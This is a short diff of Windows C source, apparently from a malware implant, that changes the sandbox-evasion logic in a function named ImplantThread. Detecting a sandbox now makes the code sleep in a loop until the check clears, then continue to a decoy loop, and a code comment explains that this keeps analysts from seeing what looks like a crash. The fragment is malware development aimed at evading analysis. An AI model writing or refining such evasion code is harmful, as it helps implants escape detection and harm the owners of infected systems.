@@ -57,11 +57,13 @@ DWORD WINAPI ImplantThread(LPVOID) {
     DBG("ImplantThread start pid=%lu", GetCurrentProcessId());
 
 #ifndef DEBUG
-    if (SandboxCheck()) {
-        DBG("sandbox detected");
+    // Loop — not return. Returning 1 triggers WinMain restart which re-checks
+    // immediately, causing an infinite sleep-restart cycle that looks like a crash.
+    while (SandboxCheck()) {
+        DBG("sandbox: early boot, waiting");
         DeepSleep();
-        return 1;
     }
+    DBG("sandbox: cleared");
 #endif
 
     DBG("DecoyLoop");
